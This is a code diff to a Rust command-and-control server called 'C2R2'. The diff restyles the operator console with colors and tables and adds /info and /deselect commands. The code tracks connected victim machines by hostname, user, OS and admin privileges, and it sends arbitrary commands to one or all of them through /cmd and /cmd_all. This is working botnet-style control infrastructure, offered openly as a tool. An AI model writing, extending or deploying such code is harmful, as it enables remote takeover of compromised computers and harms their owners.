@@ -7,6 +7,8 @@ use std::sync::atomic::{AtomicU64, Ordering};
 use std::io::{self, BufRead, Write};
 use clap::Parser;
 use chrono::Local;
+use colored::*;
+use prettytable::{Table, Row, Cell, format};
 
 type ClientId = u64;
 
@@ -70,7 +72,12 @@ async fn handle_client(
     verbose: bool,
 ) {
     let addr = stream.peer_addr().unwrap().to_string();
-    println!("🔗 Nuevo cliente [{}] desde {}", id, addr);
+    println!("{} {} {} {}", 
+        "🔗".bright_green(), 
+        "Nuevo cliente".bright_white().bold(),
+        format!("[{}]", id).bright_cyan().bold(),
+        format!("desde {}", addr).bright_white().dimmed()
+    );
 
     let (tx, mut rx) = mpsc::unbounded_channel::<String>();
     let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));
@@ -98,13 +105,13 @@ async fn handle_client(
                     let message = format!("{}\n", cmd);
                     if let Err(e) = writer.write_all(message.as_bytes()).await {
                         if verbose {
-                            eprintln!("❌ Error enviando a cliente {}: {}", id, e);
+                            eprintln!("{} Error enviando a [{}]: {}", "❌".bright_red(), id, e);
                         }
                         break;
                     }
                     if let Err(e) = writer.flush().await {
                         if verbose {
-                            eprintln!("❌ Error en flush cliente {}: {}", id, e);
+                            eprintln!("{} Error flush [{}]: {}", "❌".bright_red(), id, e);
                         }
                         break;
                     }
@@ -112,11 +119,11 @@ async fn handle_client(
                 _ = ping_interval.tick() => {
                     // Enviar ping silencioso para mantener conexión viva
                     if verbose {
-                        println!("🏓 Enviando ping a cliente [{}]", id);
+                        println!("{} Ping → {}", "🏓".bright_yellow(), format!("[{}]", id).bright_cyan());
                     }
                     if let Err(_) = writer.write_all(b"ping\n").await {
                         if verbose {
-                            eprintln!("❌ Error en ping a cliente {}", id);
+                            eprintln!("{} Error ping [{}]", "❌".bright_red(), id);
                         }
                         break;
                     }
@@ -138,7 +145,7 @@ async fn handle_client(
             match reader.read_line(&mut line).await {
                 Ok(0) => {
                     if verbose {
-                        println!("🔌 Cliente {} cerró la conexión", id);
+                        println!("{} Cliente {} desconectado", "🔌".bright_red(), format!("[{}]", id).bright_cyan());
                     }
                     return;
                 }
@@ -153,25 +160,46 @@ async fn handle_client(
                                 "hostname" => {
                                     info.hostname = Some(parts[2].to_string());
                                     if verbose {
-                                        println!("📝 Cliente [{}] hostname: {}", id, parts[2]);
+                                        println!("{} {} hostname: {}", 
+                                            "📝".bright_green(), 
+                                            format!("[{}]", id).bright_cyan(),
+                                            parts[2].bright_white()
+                                        );
                                     }
                                 }
                                 "username" => {
                                     info.username = Some(parts[2].to_string());
                                     if verbose {
-                                        println!("📝 Cliente [{}] username: {}", id, parts[2]);
+                                        println!("{} {} username: {}", 
+                                            "📝".bright_green(), 
+                                            format!("[{}]", id).bright_cyan(),
+                                            parts[2].bright_white()
+                                        );
                                     }
                                 }
                                 "os" => {
                                     info.os_version = Some(parts[2].to_string());
                                     if verbose {
-                                        println!("📝 Cliente [{}] OS: {}", id, parts[2]);
+                                        println!("{} {} OS: {}", 
+                                            "📝".bright_green(), 
+                                            format!("[{}]", id).bright_cyan(),
+                                            parts[2].bright_white()
+                                        );
                                     }
                                 }
                                 "privileges" => {
                                     info.privileges = Some(parts[2].to_string());
                                     if verbose {
-                                        println!("📝 Cliente [{}] privileges: {}", id, parts[2]);
+                                        let priv_colored = if parts[2] == "Admin" {
+                                            parts[2].bright_red().bold()
+                                        } else {
+                                            parts[2].bright_yellow().bold()
+                                        };
+                                        println!("{} {} privilegios: {}", 
+                                            "📝".bright_green(), 
+                                            format!("[{}]", id).bright_cyan(),
+                                            priv_colored
+                                        );
                                     }
                                 }
                                 _ => {}
@@ -183,7 +211,7 @@ async fn handle_client(
                     // Si es pong, ignorar
                     if line.trim() == "pong" {
                         if verbose {
-                            println!("🏓 Pong recibido de cliente [{}]", id);
+                            println!("{} Pong ← {}", "🏓".bright_yellow(), format!("[{}]", id).bright_cyan());
                         }
                         continue;
                     }
@@ -193,8 +221,15 @@ async fn handle_client(
                     if command_buffer.contains(DELIMITER) {
                         let response = command_buffer.replace(DELIMITER, "").trim().to_string();
                         if !response.is_empty() {
-                            println!("\n📨 Respuesta del cliente [{}]:", id);
+                            println!();
+                            println!("{} {} {}", 
+                                "📨".bright_blue(), 
+                                "Respuesta de".bright_white().bold(),
+                                format!("[{}]:", id).bright_cyan().bold()
+                            );
+                            println!("{}", "─".repeat(60).bright_black());
                             println!("{}", response);
+                            println!("{}", "─".repeat(60).bright_black());
                             println!();
                         }
                         command_buffer.clear();
@@ -202,7 +237,7 @@ async fn handle_client(
                 }
                 Err(e) => {
                     if verbose {
-                        eprintln!("⚠️ Error leyendo de cliente {}: {}", id, e);
+                        eprintln!("{} Error leyendo [{}]: {}", "⚠️ ".bright_yellow(), id, e);
                     }
                     return;
                 }
@@ -225,13 +260,18 @@ async fn handle_client(
 async fn main() {
     let args = Args::parse();
 
-    println!("🚀 C2R2 Server v1.0");
-    println!("🔗 Escuchando en {}:{}", args.bind, args.port);
-    println!("📝 Use /help para ver comandos disponibles");
+    // Banner con colores
+    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
+    println!("{}", "║          C2R2 - Command & Control Server v2.0            ║".bright_cyan());
+    println!("{}", "║              Direct Connection - No Shellcode            ║".bright_cyan());
+    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
+    println!();
+    println!("{} {}", "🌐 Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
+    println!("{} {}", "📝 Help:".bright_yellow().bold(), "/help".bright_white());
     if args.verbose {
-        println!("🔍 Modo verbose activado");
+        println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
     }
-    println!("{}", "-".repeat(50));
+    println!();
 
     let listener = TcpListener::bind(format!("{}:{}", args.bind, args.port))
         .await
@@ -254,7 +294,7 @@ async fn main() {
                     tokio::spawn(handle_client(id, stream, clients, verbose));
                 }
                 Err(e) => {
-                    eprintln!("❌ Error aceptando conexión: {}", e);
+                    eprintln!("{} {}", "❌ Error:".bright_red().bold(), e);
                 }
             }
         }
@@ -265,7 +305,13 @@ async fn main() {
     let mut lines = stdin.lock().lines();
 
     loop {
-        print!("> ");
+        // Mostrar prompt con cliente seleccionado
+        let selected = *selected_client.lock().unwrap();
+        if let Some(id) = selected {
+            print!("{} ", format!("C2R2[{}]>", id).bright_green().bold());
+        } else {
+            print!("{} ", "C2R2>".bright_blue().bold());
+        }
         let _ = io::stdout().flush();
 
         if let Some(Ok(line)) = lines.next() {
@@ -277,43 +323,103 @@ async fn main() {
 
             match parts[0] {
                 "/help" => {
-                    println!("📖 Comandos disponibles:");
-                    println!("  /list                    -> lista clientes conectados con info");
-                    println!("  /select <id>             -> selecciona un cliente por ID");
-                    println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
-                    println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
-                    println!("  /exit, /quit             -> cierra el servidor");
-                    println!("  /help                    -> muestra esta ayuda");
+                    println!();
+                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
+                    println!("{}", "                    📖 COMANDOS DISPONIBLES".bright_cyan().bold());
+                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
+                    println!();
+                    println!("  {} {:<20} {}", "📋".bright_yellow(), "/list", "Lista todos los clientes conectados con info".bright_white());
+                    println!("  {} {:<20} {}", "🎯".bright_green(), "/select <id>", "Selecciona un cliente por ID".bright_white());
+                    println!("  {} {:<20} {}", "📤".bright_blue(), "/cmd <comando>", "Envía comando al cliente seleccionado".bright_white());
+                    println!("  {} {:<20} {}", "📡".bright_magenta(), "/cmd_all <cmd>", "Envía comando a TODOS los clientes".bright_white());
+                    println!("  {} {:<20} {}", "ℹ️ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
+                    println!("  {} {:<20} {}", "🔄".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
+                    println!("  {} {:<20} {}", "👋".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
+                    println!("  {} {:<20} {}", "❓".bright_cyan(), "/help", "Muestra este menú".bright_white());
+                    println!();
+                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
+                    println!();
                 }
                 "/list" => {
                     let clients = clients.lock().unwrap();
                     if clients.is_empty() {
-                        println!("  No hay clientes conectados");
+                        println!("{}", "⚠️  No hay clientes conectados".bright_yellow());
                     } else {
-                        println!("\n📋 Clientes conectados:");
-                        println!("{}", "=".repeat(130));
-                        println!("{:<4} {:<22} {:<18} {:<18} {:<25} {:<12} {:<20}", 
-                            "ID", "Dirección", "Hostname", "Usuario", "OS", "Privilegios", "Conectado");
-                        println!("{}", "-".repeat(130));
+                        println!();
+                        let mut table = Table::new();
+                        table.set_format(*format::consts::FORMAT_BOX_CHARS);
+                        
+                        // Header con colores
+                        table.add_row(Row::new(vec![
+                            Cell::new("ID").style_spec("Fb"),
+                            Cell::new("Dirección").style_spec("Fb"),
+                            Cell::new("Hostname").style_spec("Fb"),
+                            Cell::new("Usuario").style_spec("Fb"),
+                            Cell::new("OS").style_spec("Fb"),
+                            Cell::new("Privilegios").style_spec("Fb"),
+                            Cell::new("Conectado").style_spec("Fb"),
+                        ]));
                         
                         for (id, client) in clients.iter() {
                             let info = client.info.lock().unwrap();
-                            println!("{:<4} {:<22} {:<18} {:<18} {:<25} {:<12} {:<20}",
-                                id,
-                                info.addr,
-                                info.hostname.as_deref().unwrap_or("Recopilando..."),
-                                info.username.as_deref().unwrap_or("Recopilando..."),
-                                info.os_version.as_deref().unwrap_or("Recopilando..."),
-                                info.privileges.as_deref().unwrap_or("Recopilando..."),
-                                info.connected_at
-                            );
+                            let priv_color = if info.privileges.as_deref() == Some("Admin") { "Fr" } else { "Fy" };
+                            
+                            table.add_row(Row::new(vec![
+                                Cell::new(&id.to_string()).style_spec("Fc"),
+                                Cell::new(&info.addr),
+                                Cell::new(info.hostname.as_deref().unwrap_or("...")),
+                                Cell::new(info.username.as_deref().unwrap_or("...")),
+                                Cell::new(info.os_version.as_deref().unwrap_or("...")),
+                                Cell::new(info.privileges.as_deref().unwrap_or("...")).style_spec(priv_color),
+                                Cell::new(&info.connected_at).style_spec("Fd"),
+                            ]));
                         }
-                        println!("{}", "=".repeat(130));
+                        
+                        println!("{}", format!("📋 {} cliente(s) conectado(s)", clients.len()).bright_green().bold());
+                        table.printstd();
+                        println!();
+                    }
+                }
+                "/info" => {
+                    if parts.len() < 2 {
+                        println!("{} /info <id>", "❌ Uso:".bright_red());
+                        continue;
+                    }
+                    
+                    if let Ok(id) = parts[1].parse::<ClientId>() {
+                        let clients = clients.lock().unwrap();
+                        if let Some(client) = clients.get(&id) {
+                            let info = client.info.lock().unwrap();
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
+                            println!("{}", format!("║              INFORMACIÓN DEL CLIENTE [{}]                ║", id).bright_cyan().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
+                            println!();
+                            println!("  {} {}", "🆔 ID:".bright_green().bold(), id.to_string().bright_white());
+                            println!("  {} {}", "🌐 Dirección:".bright_green().bold(), info.addr.bright_white());
+                            println!("  {} {}", "💻 Hostname:".bright_green().bold(), info.hostname.as_deref().unwrap_or("N/A").bright_white());
+                            println!("  {} {}", "👤 Usuario:".bright_green().bold(), info.username.as_deref().unwrap_or("N/A").bright_white());
+                            println!("  {} {}", "🖥️  OS:".bright_green().bold(), info.os_version.as_deref().unwrap_or("N/A").bright_white());
+                            
+                            let priv_str = info.privileges.as_deref().unwrap_or("N/A");
+                            let priv_colored = if priv_str == "Admin" { 
+                                priv_str.bright_red().bold() 
+                            } else { 
+                                priv_str.bright_yellow().bold() 
+                            };
+                            println!("  {} {}", "🔑 Privilegios:".bright_green().bold(), priv_colored);
+                            println!("  {} {}", "⏰ Conectado:".bright_green().bold(), info.connected_at.bright_white());
+                            println!();
+                        } else {
+                            println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
+                        }
+                    } else {
+                        println!("{} ID inválido", "❌".bright_red());
                     }
                 }
                 "/select" => {
                     if parts.len() < 2 {
-                        println!("❌ Uso: /select <id>");
+                        println!("{} /select <id>", "❌ Uso:".bright_red());
                         continue;
                     }
                     
@@ -321,18 +427,22 @@ async fn main() {
                         let clients = clients.lock().unwrap();
                         if clients.contains_key(&id) {
                             *selected_client.lock().unwrap() = Some(id);
-                            println!("✅ Cliente [{}] seleccionado", id);
-                            println!("ℹ️ Ahora puedes usar /cmd <comando>");
+                            println!("{} {}", "✅ Cliente".bright_green(), format!("[{}]", id).bright_cyan().bold());
+                            println!("{}", "   Usa /cmd <comando> para enviar comandos".bright_white().dimmed());
                         } else {
-                            println!("❌ Cliente {} no encontrado", id);
+                            println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
                         }
                     } else {
-                        println!("❌ ID inválido");
+                        println!("{} ID inválido", "❌".bright_red());
                     }
+                }
+                "/deselect" => {
+                    *selected_client.lock().unwrap() = None;
+                    println!("{}", "✅ Cliente deseleccionado".bright_green());
                 }
                 "/cmd" => {
                     if parts.len() < 2 {
-                        println!("❌ Uso: /cmd <comando>");
+                        println!("{} /cmd <comando>", "❌ Uso:".bright_red());
                         continue;
                     }
                     
@@ -344,21 +454,25 @@ async fn main() {
                         
                         if let Some(client) = clients.get(&id) {
                             if let Err(e) = client.tx.send(command.clone()) {
-                                println!("❌ Error enviando comando: {}", e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                             } else {
-                                println!("📤 Comando enviado a [{}]: {}", id, command);
+                                println!("{} {} → {}", 
+                                    "📤".bright_blue(), 
+                                    format!("[{}]", id).bright_cyan().bold(), 
+                                    command.bright_white()
+                                );
                             }
                         } else {
-                            println!("❌ Cliente {} no encontrado, deseleccionando", id);
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                             *selected_client.lock().unwrap() = None;
                         }
                     } else {
-                        println!("❌ No hay cliente seleccionado. Use /select <id>");
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                     }
                 }
                 "/cmd_all" => {
                     if parts.len() < 2 {
-                        println!("❌ Uso: /cmd_all <comando>");
+                        println!("{} /cmd_all <comando>", "❌ Uso:".bright_red());
                         continue;
                     }
                     
@@ -366,24 +480,34 @@ async fn main() {
                     let clients = clients.lock().unwrap();
                     
                     if clients.is_empty() {
-                        println!("❌ No hay clientes conectados");
+                        println!("{}", "❌ No hay clientes conectados".bright_red());
                     } else {
                         let mut count = 0;
                         for (id, client) in clients.iter() {
                             if client.tx.send(command.clone()).is_ok() {
-                                println!("📤 Comando enviado a [{}]", id);
+                                println!("{} {} → {}", 
+                                    "�".bright_magenta(), 
+                                    format!("[{}]", id).bright_cyan().bold(), 
+                                    command.bright_white().dimmed()
+                                );
                                 count += 1;
                             }
                         }
-                        println!("✅ Comando enviado a {} cliente(s)", count);
+                        println!("{} Enviado a {} cliente(s)", "✅".bright_green(), count.to_string().bright_cyan().bold());
                     }
                 }
                 "/exit" | "/quit" => {
-                    println!("👋 Cerrando servidor...");
+                    println!();
+                    println!("{}", "👋 Cerrando C2R2 Server...".bright_yellow().bold());
+                    println!();
                     std::process::exit(0);
                 }
                 _ => {
-                    println!("❌ Comando desconocido. Use /help");
+                    println!("{} Comando '{}' desconocido. Usa {}", 
+                        "❌".bright_red(), 
+                        parts[0].bright_yellow(), 
+                        "/help".bright_cyan()
+                    );
                 }
             }
         }
